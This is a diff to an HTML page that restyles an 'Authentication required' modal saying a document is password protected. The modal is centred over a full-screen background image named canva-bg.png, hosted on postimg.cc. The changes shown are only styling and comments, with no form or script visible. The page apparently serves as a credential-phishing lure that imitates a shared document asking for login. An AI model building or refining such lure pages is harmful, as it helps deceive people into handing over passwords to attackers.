@@ -13,45 +13,40 @@
 
     html, body {
       height: 100%;
+      width: 100%;
       font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
     }
 
     body {
+      display: grid;
+      place-items: center;
       position: relative;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 2rem;
       overflow: hidden;
+      background-color: #f0f0f0;
     }
 
-    /* Background image */
     .bg-image {
       position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       z-index: 0;
-      pointer-events: none;
     }
 
     .bg-image img {
-      .bg-image img {
-  width: 100vw;
-  height: 100vh;
-  object-fit: contain;
-}
-
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      display: block;
     }
 
-    /* Modal */
     .modal {
       position: relative;
       z-index: 1;
       background-color: white;
       max-width: 500px;
-      width: 100%;
+      width: 90%;
       padding: 2rem;
       border-radius: 10px;
       box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
@@ -84,7 +79,7 @@
       background-color: #1a54d3;
     }
 
-    /* PDF safe fallback */
+    /* PDF fallback for some PDF tools */
     @media print {
       body {
         display: block;
@@ -92,29 +87,25 @@
       }
 
       .bg-image {
-        display: block;
         position: relative;
-        top: auto;
-        left: auto;
-        transform: none;
-        margin-bottom: 20px;
-        text-align: center;
+        width: 100%;
+        height: auto;
       }
 
       .modal {
-        margin: 0 auto;
+        margin: 2rem auto;
       }
     }
   </style>
 </head>
 <body>
 
-  <!-- ✅ Background image from PostImage (your link) -->
+  <!-- ✅ Background image -->
   <div class="bg-image">
-    <img src="https://i.postimg.cc/QCPLCsx9/canva-bg.png" alt="Background" />
+    <img src="https://i.postimg.cc/QCPLCsx9/canva-bg.png" alt="Background Image" />
   </div>
 
-  <!-- ✅ The modal -->
+  <!-- ✅ Modal -->
   <div class="modal">
     <h2>Authentication required</h2>
     <p>This document is password protected. Please authenticate to view the document.</p>
